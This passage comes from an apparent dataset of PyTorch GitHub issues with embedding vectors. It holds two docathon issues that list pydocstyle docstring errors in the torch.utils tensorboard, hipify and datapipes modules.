 -5.85466763e-03 -2.31702551e-01  1.41952515e-01 -2.39912748e-01
  7.73552507e-02 -4.21602219e-01 -1.97676271e-01  3.50379348e-01
 -7.84660727e-02 -1.46551877e-01  7.49366805e-02 -3.69877331e-02
  2.20825434e-01  9.57204215e-03  1.43861063e-02 -1.26647890e-01
  1.38690650e-01  2.25602508e-01  2.72030622e-01  1.23747982e-01
 -3.09809417e-01  1.58205777e-01 -2.50491410e-01  1.82173133e-01
  1.45885825e-01  5.78482635e-03  1.00056872e-01 -7.96620771e-02
  4.90381382e-03 -1.23387150e-01  3.67262244e-01 -7.61627257e-02
  4.53242734e-02 -3.91754657e-01  2.18417749e-01 -1.26397043e-01
 -3.36322546e-01  1.90398276e-01  1.32213190e-01  8.64143148e-02
 -6.55433387e-02 -4.84005511e-01  2.51682252e-02  1.09707601e-02
 -2.97088295e-01 -4.27109212e-01 -1.77798271e-02 -3.09469968e-01
  4.14161444e-01  3.76140296e-01 -4.28694248e-01  4.16801870e-01
  1.51114492e-02  9.04426873e-02  1.01043321e-02  1.53860971e-01
 -2.60780573e-01  3.90663564e-01  3.70531231e-02  4.67517674e-02
  4.94768262e-01  5.40733822e-02 -7.35972077e-02 -3.55847120e-01
 -4.77841087e-02  7.95795768e-02  3.01374216e-02 -3.18649523e-02
 -2.73975432e-01  4.18536775e-02 -2.64962584e-01 -2.15388626e-01
 -4.68211353e-01 -2.99564362e-01 -1.19268104e-01  2.79256821e-01
 -6.94864020e-02 -2.28578418e-01  9.36524123e-02  1.70955718e-01
 -2.56046891e-01 -2.60016799e-01 -6.77420050e-02  2.32649431e-01
 -2.53718257e-01  4.84897733e-01 -7.81119019e-02 -4.38414142e-02
 -1.53007478e-01  2.16089040e-02 -3.96155193e-02 -2.33176216e-01
  2.98269391e-01  2.49002486e-01  5.20318225e-02 -3.71563286e-01
  1.69007599e-01  8.57060403e-02 -9.70101450e-04 -7.39224702e-02
  3.26566041e-01  6.98945880e-01  1.58003986e-01  2.41709918e-01
 -1.62693322e-01  2.48403028e-01  3.05696219e-01  5.13212234e-02
  3.62812161e-01 -3.92134674e-02 -3.20634782e-01 -1.55058295e-01
 -2.32992291e-01  1.16322801e-01 -3.09475005e-01 -5.41254878e-04
  5.72439022e-02 -2.35876516e-01 -2.81383693e-01  3.05909514e-01
  1.77154392e-01 -1.43716842e-01  3.50503117e-01 -1.20870344e-01
 -3.62341225e-01  1.22459978e-02 -1.28286287e-01 -2.99755991e-01
  3.76985431e-01  1.81879446e-01  1.02942191e-01  1.44674689e-01
 -4.44911644e-02  3.05702481e-02 -5.01210988e-02  5.15155122e-02
  7.03782916e-01 -9.02854130e-02  1.76402658e-01  1.16561942e-01
 -1.37724411e-02 -5.81753999e-02  1.66230917e-01  2.10967392e-01
 -4.16663289e-02  4.08959687e-02  1.34966597e-01 -4.31506336e-02
  2.57754356e-01 -4.20704722e-01 -1.75824642e-01 -3.01578104e-01
 -3.85349900e-01  1.73985749e-01 -1.76256940e-01 -5.53622842e-01
  4.64403182e-02  6.92254603e-02  5.53910077e-01  2.75338709e-01
 -3.72308344e-01 -9.40927565e-02  4.55135964e-02  2.37038076e-01
 -2.55074985e-02  2.96884924e-01 -7.37425163e-02  2.63593435e-01
  3.37750852e-01 -3.51206660e-02 -3.34515601e-01  1.71030551e-01
 -3.99862900e-02 -1.63925081e-01  1.45837575e-01 -4.98617083e-01
  3.99440616e-01  1.56630218e-01  5.55822134e-01  2.14794159e-01
  3.31029713e-01 -1.46862000e-01 -1.93106793e-02 -3.13773379e-02
 -2.13377565e-01  3.97708893e-01 -3.23214173e-01 -1.38152987e-01
  4.22480226e-01 -1.22746497e-01 -3.16292167e-01 -2.79834121e-01
 -6.03351116e-01 -1.64075166e-01 -4.97386232e-02  1.01927683e-01
  5.48931241e-01  1.48368124e-02 -1.46129966e-01  1.19608730e-01
  7.91725814e-02  1.00326709e-01  3.15821350e-01 -3.62528935e-02
 -6.33895338e-01 -1.84312150e-01 -3.27143073e-02  2.26338834e-01
  2.68051535e-01  1.63635761e-01  5.81214055e-02  1.03461824e-01
  1.21871904e-02 -3.83126199e-01  3.69640589e-01  3.72169763e-01
 -3.05286765e-01  2.03982443e-01 -4.55232784e-02  1.89341512e-02
  5.40391989e-02  5.89263260e-01  2.14599609e-01 -1.28955171e-02
 -4.96286266e-02 -4.59380299e-01 -2.40814298e-01  1.44439340e-01
  2.01247901e-01 -6.53934181e-02 -4.39416349e-01  1.18681654e-01
 -2.16276333e-01 -3.94132107e-01  1.44869909e-01  1.87510192e-01
 -3.90352271e-02 -5.19424081e-02 -1.01554185e-01  1.81612790e-01
 -2.09011853e-01  1.45459071e-01  1.03587307e-01 -2.87684709e-01
  7.12615550e-02 -1.48753002e-01  9.92897749e-02 -6.26219034e-01
 -1.31660536e-01 -2.00021267e-02  3.60157847e-01  1.59143478e-01
 -2.46733785e-01 -4.05257225e-01  3.55852783e-01 -1.81194842e-01
 -4.17405128e-01  3.19359154e-02 -2.62906730e-01  5.08357704e-01
 -1.52479291e-01  2.74982065e-01  4.77468502e-03  4.34312254e-01
 -5.13016880e-01  2.81097535e-02 -3.51145416e-01 -4.48311061e-01
 -5.28012328e-02 -1.81650490e-01 -1.86526343e-01  1.30985484e-01
  2.82453895e-02  2.73223035e-02 -4.32648242e-01  1.47412494e-01
 -2.40797251e-01  2.42874861e-01  3.08109105e-01  3.63833904e-01
  1.98708832e-01  2.68693101e-02  1.66611999e-01 -2.19528228e-01
 -5.29834628e-01  3.90472949e-01  4.01844621e-01 -2.85950094e-01]"
"Fix docstring errors in summary.py, _caffe2_graph.py, writer.py, _pytorch_graph.py, constants.py, _utils.py, _proto_graph.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/utils/tensorboard/_proto_graph.py`, **Entity**: `attr_value_proto`, **Line**: 8, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_proto_graph.py`, **Entity**: `attr_value_proto`, **Line**: 8, **Description**: First line should end with a period (not 'g')
- **File**: `torch/utils/tensorboard/_proto_graph.py`, **Entity**: `attr_value_proto`, **Line**: 8, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/utils/tensorboard/_proto_graph.py`, **Entity**: `tensor_shape_proto`, **Line**: 23, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_proto_graph.py`, **Entity**: `tensor_shape_proto`, **Line**: 23, **Description**: First line should end with a period (not 'g')
- **File**: `torch/utils/tensorboard/_proto_graph.py`, **Entity**: `tensor_shape_proto`, **Line**: 23, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/utils/tensorboard/_proto_graph.py`, **Entity**: `node_proto`, **Line**: 38, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_proto_graph.py`, **Entity**: `node_proto`, **Line**: 38, **Description**: First line should end with a period (not 'g')
- **File**: `torch/utils/tensorboard/_proto_graph.py`, **Entity**: `node_proto`, **Line**: 38, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `GraphPy`, **Line**: 122, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `GraphPy`, **Line**: 122, **Description**: First line should end with a period (not 'n')
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `to_proto`, **Line**: 216, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `to_proto`, **Line**: 216, **Description**: First line should end with a period (not 'd')
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `to_proto`, **Line**: 216, **Description**: First line should be in imperative mood (perhaps 'Convert', not 'Converts')
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `parse`, **Line**: 237, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `parse`, **Line**: 237, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `parse`, **Line**: 237, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `graph`, **Line**: 322, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `graph`, **Line**: 322, **Description**: First line should end with a period (not 'o')
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `graph`, **Line**: 322, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `_set_model_to_eval`, **Line**: 368, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/utils/tensorboard/_pytorch_graph.py`, **Entity**: `_node_get`, **Line**: 385, **Description**: First line should be in imperative mood (perhaps 'Get', not 'Gets')
- **File**: `torch/utils/tensorboard/_utils.py`, **Entity**: `_prepare_video`, **Line**: 40, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_utils.py`, **Entity**: `_prepare_video`, **Line**: 40, **Description**: First line should end with a period (not ']')
- **File**: `torch/utils/tensorboard/_utils.py`, **Entity**: `_prepare_video`, **Line**: 40, **Description**: First line should be in imperative mood (perhaps 'Convert', not 'Converts')
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `hparams`, **Line**: 76, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `hparams`, **Line**: 76, **Description**: First line should be in imperative mood (perhaps 'Output', not 'Outputs')
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `scalar`, **Line**: 265, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `scalar`, **Line**: 265, **Description**: First line should be in imperative mood (perhaps 'Output', not 'Outputs')
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `histogram_raw`, **Line**: 308, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `histogram_raw`, **Line**: 308, **Description**: First line should be in imperative mood (perhaps 'Output', not 'Outputs')
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `histogram`, **Line**: 340, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `histogram`, **Line**: 340, **Description**: First line should be in imperative mood (perhaps 'Output', not 'Outputs')
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `image`, **Line**: 415, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `image`, **Line**: 415, **Description**: First line should be in imperative mood (perhaps 'Output', not 'Outputs')
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `image_boxes`, **Line**: 453, **Description**: First line should be in imperative mood (perhaps 'Output', not 'Outputs')
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `make_image`, **Line**: 482, **Description**: First line should end with a period (not 'f')
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `_get_tensor_summary`, **Line**: 734, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `_get_json_config`, **Line**: 791, **Description**: First line should be in imperative mood (perhaps 'Parse', not 'Parses')
- **File**: `torch/utils/tensorboard/summary.py`, **Entity**: `mesh`, **Line**: 802, **Description**: First line should be in imperative mood (perhaps 'Output', not 'Outputs')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: ``, **Line**: 1, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'e')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `__init__`, **Line**: 55, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `__init__`, **Line**: 55, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `get_logdir`, **Line**: 81, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_event`, **Line**: 85, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_event`, **Line**: 85, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_summary`, **Line**: 101, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_summary`, **Line**: 101, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_graph`, **Line**: 116, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_onnx_graph`, **Line**: 135, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `flush`, **Line**: 146, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `close`, **Line**: 153, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `reopen`, **Line**: 159, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `SummaryWriter`, **Line**: 168, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `SummaryWriter`, **Line**: 168, **Description**: First line should end with a period (not 'e')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `__init__`, **Line**: 187, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `__init__`, **Line**: 187, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `__init__`, **Line**: 187, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `_check_caffe2_blob`, **Line**: 260, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `_check_caffe2_blob`, **Line**: 260, **Description**: First line should end with a period (not 'f')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `_get_file_writer`, **Line**: 275, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `get_logdir`, **Line**: 296, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_scalars`, **Line**: 394, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_histogram_raw`, **Line**: 501, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_pr_curve`, **Line**: 981, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_pr_curve`, **Line**: 981, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_pr_curve_raw`, **Line**: 1033, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_custom_scalars_multilinechart`, **Line**: 1069, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_custom_scalars_multilinechart`, **Line**: 1069, **Description**: First line should end with a period (not 't')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_custom_scalars_marginchart`, **Line**: 1088, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_custom_scalars_marginchart`, **Line**: 1088, **Description**: First line should end with a period (not 't')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_custom_scalars`, **Line**: 1106, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_custom_scalars`, **Line**: 1106, **Description**: First line should end with a period (not 'e')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_mesh`, **Line**: 1137, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `add_mesh`, **Line**: 1137, **Description**: First line should end with a period (not ',')
- **File**: `torch/utils/tensorboard/writer.py`, **Entity**: `flush`, **Line**: 1193, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_rename_tensorflow_style`, **Line**: 42, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_convert_to_ssa`, **Line**: 82, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_add_gradient_scope`, **Line**: 217, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_add_gradient_scope`, **Line**: 217, **Description**: First line should end with a period (not 'a')
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_replace_colons`, **Line**: 243, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_replace_colons`, **Line**: 243, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_fill_missing_operator_names`, **Line**: 267, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_add_tf_shape`, **Line**: 325, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_add_tf_shape`, **Line**: 325, **Description**: First line should end with a period (not 'f')
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_add_tf_shape`, **Line**: 325, **Description**: First line should be in imperative mood (perhaps 'Convert', not 'Converts')
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_set_tf_attr`, **Line**: 345, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_set_tf_attr`, **Line**: 345, **Description**: First line should end with a period (not ',')
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_operator_to_node`, **Line**: 390, **Description**: First line should be in imperative mood (perhaps 'Convert', not 'Converts')
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_blob_to_node`, **Line**: 479, **Description**: First line should be in imperative mood (perhaps 'Convert', not 'Converts')
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_clear_debug_info`, **Line**: 514, **Description**: First line should be in imperative mood (perhaps 'Remove', not 'Removes')
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_check_if_forward`, **Line**: 537, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `_operators_to_graph_def`, **Line**: 638, **Description**: First line should be in imperative mood; try rephrasing (found 'Main')
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `model_to_graph_def`, **Line**: 762, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_caffe2_graph.py`, **Entity**: `model_to_graph_def`, **Line**: 762, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/hipify/constants.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/hipify/constants.py`, **Entity**: ``, **Line**: 1, **Description**: No whitespaces allowed surrounding docstring text

cc @carljparker",False,"[-2.04170436e-01 -3.28588009e-01 -7.51354322e-02 -5.05245440e-02
  2.24342316e-01  3.61399120e-03 -6.00588247e-02  1.90507576e-01
 -4.48737979e-01  2.40186416e-02 -8.76392722e-02 -3.84100080e-02
  1.92492545e-01  1.41462982e-01 -1.80191040e-01  9.32834893e-02
 -2.64103860e-01 -4.98631954e-01  1.82337582e-01  9.59803015e-02
  1.67963579e-01  4.28452075e-01 -9.96816009e-02  2.13505905e-02
 -1.14325583e-01  1.14582069e-02 -3.03006530e-01 -2.19607726e-01
  7.77735561e-02 -3.90608460e-02  4.33024079e-01  2.81453967e-01
 -2.39326209e-01 -2.74694730e-02  4.11557257e-01  1.92559958e-01
 -1.86515063e-01 -1.51238590e-01  5.50969914e-02  4.83659655e-02
 -7.69477040e-02 -8.63095820e-02 -6.67670667e-02  1.46303415e-01
  1.18535995e-01 -1.51837707e-01 -7.65509456e-02  1.40103474e-01
 -5.85734807e-02  2.34970674e-01 -2.62870371e-01  7.61578828e-02
 -2.46958092e-01 -1.68423742e-01  3.33433747e-01  9.70220715e-02
 -1.11705929e-01  5.05239010e-01  1.50190473e-01 -1.26838595e-01
  2.44504303e-01  5.12213148e-02 -3.65103595e-04  1.68383956e-01
  1.51624620e-01  1.75516188e-01 -3.87571752e-03  2.12885827e-01
  4.21790212e-01  1.00139134e-01 -1.38383225e-01  1.49615213e-01
 -5.41222751e-01 -2.34894902e-01  4.12845388e-02  3.55360955e-01
 -5.79254746e-01 -1.13280296e-01 -3.08078140e-01 -3.30348462e-01
 -2.37626225e-01  2.13646293e-02  9.21746790e-02  5.25897369e-03
  5.40380441e-02 -8.13535303e-02  3.48200858e-01 -2.59005576e-01
  1.77760541e-01  1.49233669e-01  6.51601911e-01 -1.75822526e-01
 -4.11339737e-02  4.03160036e-01  6.04228750e-02  3.70773673e-01
 -3.65491509e-02 -1.07811019e-02  1.79445848e-01 -2.30023459e-01
  4.76562753e-02 -4.58483636e-01 -1.13904715e-01  1.74957216e-01
 -1.56718232e-02 -2.34000415e-01  1.19039463e-02  2.56388597e-02
  2.73222923e-01 -8.41709003e-02  1.18660554e-01 -2.36471444e-01
  1.10469624e-01  3.61245811e-01  4.67868119e-01  4.46104854e-02
 -1.86405301e-01  2.15500873e-02 -2.61565149e-01  1.68642998e-01
  2.92859107e-01  3.34084392e-01  1.43503994e-01 -2.70065144e-02
 -3.10178790e-02  2.00325754e-02  2.35616058e-01 -1.13033578e-01
  7.51138180e-02 -2.78393209e-01  2.18106478e-01  7.43599683e-02
 -1.88110292e-01  8.23049545e-02  1.67477399e-01  1.06348380e-01
 -5.57460077e-02 -2.94759691e-01 -2.09426042e-02  1.42007828e-01
 -3.90752137e-01 -2.62776971e-01 -2.27348566e-01 -2.62897462e-01
  2.37196907e-01  2.75975406e-01 -5.04921794e-01  3.79955977e-01
  1.25193968e-03  1.42343089e-01  7.66595975e-02  7.73785189e-02
 -2.31749982e-01  5.33220887e-01 -2.42044441e-02  1.24720797e-01
  3.53565544e-01  7.73164928e-02 -7.37719685e-02 -3.97465229e-01
  2.51637772e-04  3.45254779e-01 -1.01153031e-01  5.61042875e-03
 -2.99170822e-01  1.71197489e-01 -1.72934890e-01 -4.11199257e-02
 -3.92750561e-01 -9.57492366e-02  8.14087838e-02  1.99889302e-01
  5.14476262e-02 -2.29322135e-01  1.25138864e-01  7.10680038e-02
 -2.63326854e-01 -3.00318182e-01 -1.40401751e-01  3.55511427e-01
  1.12983361e-01  5.09267211e-01  1.24807879e-01  7.89570808e-02
 -2.47667059e-01  1.92694664e-01  2.32269794e-01 -1.97689772e-01
  3.06684017e-01  4.06942099e-01  1.96910203e-02 -1.67050749e-01
  1.34026006e-01  1.43962502e-01 -1.32422030e-01  8.31770673e-02
  4.63781178e-01  3.03129613e-01  1.49870515e-01  1.69606477e-01
 -9.12264884e-02  1.39880270e-01  4.95456755e-01 -1.05623379e-01
  3.33075523e-01 -1.94608077e-01 -3.91595721e-01 -2.45622203e-01
 -2.10725725e-01  4.68417816e-03 -4.23559248e-01 -1.82788402e-01
 -4.28263173e-02 -3.18047196e-01 -1.86682284e-01  5.03099442e-01
  3.10880430e-02 -1.82122692e-01  2.48344809e-01 -1.22790150e-01
 -2.86988139e-01  6.35020435e-02 -1.59398377e-01 -2.79086947e-01
  2.83832014e-01  1.65198356e-01 -6.22090250e-02  1.06371418e-02
 -5.97034879e-02 -3.78700420e-02 -7.02549964e-02 -7.30554909e-02
  5.96449256e-01 -2.35299528e-01  2.08946884e-01  1.03318483e-01
 -2.95503736e-02 -5.72874323e-02 -1.13259032e-02  2.38207445e-01
 -8.37353691e-02  2.57200822e-02 -4.40895110e-02  4.21835482e-02
  4.13128287e-02 -2.89833009e-01 -2.47841135e-01 -1.17057830e-01
 -2.92159200e-01  9.07620862e-02 -1.75138429e-01 -5.10682166e-01
  2.79737338e-02 -3.11938254e-03  5.44662595e-01  1.02394789e-01
 -2.61191994e-01 -1.15443543e-02  9.06048436e-03  9.31420922e-02
  7.39457011e-02  1.11496426e-01 -2.15428192e-02  2.37035006e-01
  3.12169194e-01 -1.36384010e-01 -2.19284862e-01  2.59653106e-02
  1.26234844e-01 -3.90949696e-02  9.05532539e-02 -6.86544418e-01
  3.49881202e-01  1.52450442e-01  5.14144778e-01  1.01172127e-01
  4.21517134e-01 -8.18625167e-02 -5.28498273e-03 -8.83506238e-02
 -1.71823084e-01  5.28057933e-01 -3.29427719e-01  1.63302645e-02
  2.48338610e-01 -2.62317359e-02 -1.17678039e-01 -2.63458848e-01
 -5.52375615e-01 -1.61279127e-01 -2.63883799e-01  9.62968171e-02
  4.12447512e-01 -7.29294047e-02 -5.53350747e-02  2.38232881e-01
 -8.94257054e-03  1.67890623e-01  2.54188418e-01  1.73391715e-01
 -4.71467674e-01 -5.57337850e-02 -1.24613822e-01  9.14580077e-02
  7.90926516e-02  2.41180539e-01  1.55900910e-01 -1.89174358e-02
  1.52982280e-01 -5.82528353e-01  3.31977099e-01  3.15526605e-01
 -2.62283802e-01  3.10951352e-01  6.52470365e-02 -7.12953806e-02
 -1.10238962e-01  5.67934275e-01  1.90178856e-01  3.54021639e-02
 -1.43131435e-01 -4.24917728e-01 -2.15743005e-01 -6.18258007e-02
  1.39847010e-01  5.32833412e-02 -3.80159378e-01 -2.17600930e-02
 -1.71313643e-01 -3.22745085e-01  3.70469749e-01  1.69304997e-01
 -1.05000630e-01 -9.57074910e-02 -1.60987228e-01  3.36610638e-02
 -2.70689845e-01  1.29788220e-01  3.89597490e-02 -3.26468706e-01
 -5.64593375e-02 -2.33956963e-01  2.34261602e-02 -5.54942071e-01
 -1.96669213e-02 -1.61254242e-01  9.04462393e-03  2.33128160e-01
 -4.94983375e-01 -5.30493259e-01  4.86390233e-01 -8.63424465e-02
 -2.30363682e-01  5.68356365e-03 -1.09497294e-01  4.63783205e-01
 -2.02397928e-02  2.70689577e-01 -5.78870364e-02  3.40732515e-01
 -6.60508811e-01 -8.74074996e-02 -3.05525243e-01 -3.78815413e-01
  2.56090499e-02 -2.09041044e-01 -3.17092657e-01  9.44138169e-02
  8.12335610e-02 -1.09085292e-01 -2.82343745e-01  1.84436828e-01
 -1.35515794e-01  2.26072609e-01  3.86682957e-01  2.82978117e-01
  1.97091810e-02  1.35589764e-01  5.93485385e-02 -3.60083669e-01
 -4.48995531e-01  4.72695261e-01  4.30609107e-01 -3.93864512e-01]"
"Fix docstring errors in decoder.py, callable.py, combining.py, combinatorics.py, grouping.py, utils.py, structures.py, fileopener.py, snapshot.py, _convert_np.py, datapipe.py, common.py, filelister.py, sharding.py, streamreader.py, selecting.py, routeddecoder.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/utils/data/datapipes/datapipe.py`, **Entity**: `IterDataPipe`, **Line**: 43, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/datapipe.py`, **Entity**: `__getstate__`, **Line**: 158, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/datapipe.py`, **Entity**: `__getstate__`, **Line**: 158, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/utils/data/datapipes/datapipe.py`, **Entity**: `reset`, **Line**: 205, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/datapipe.py`, **Entity**: `reset`, **Line**: 205, **Description**: First line should end with a period (not ',')
- **File**: `torch/utils/data/datapipes/datapipe.py`, **Entity**: `MapDataPipe`, **Line**: 220, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/datapipe.py`, **Entity**: `__getstate__`, **Line**: 290, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/datapipe.py`, **Entity**: `__getstate__`, **Line**: 290, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
